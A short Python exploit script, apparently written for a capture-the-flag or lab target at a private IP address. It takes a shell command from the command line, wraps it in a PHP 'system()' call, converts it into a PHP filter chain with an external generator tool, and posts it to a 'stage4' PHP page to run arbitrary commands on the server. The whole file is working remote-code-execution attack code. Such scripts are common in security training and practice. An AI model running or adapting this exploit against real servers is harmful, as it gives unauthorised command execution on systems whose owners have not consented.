import requests
import subprocess
from sys import *

url = "http://172.31.210.1:33002/stage4_b182g38e7db23o8eo8qwdehb23asd311.php"

command = ""
for i in argv[1:]:
    command += i + ' '

result = subprocess.Popen(['python', './php_filter_chain_generator/php_filter_chain_generator.py', '--chain', f'<?php system("{command}")?>'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

payload, _ = result.communicate()
# print(payload.splitlines())
data = {"👀": payload.splitlines()[-1]}
response = requests.post(url, data=data)
print(response.text)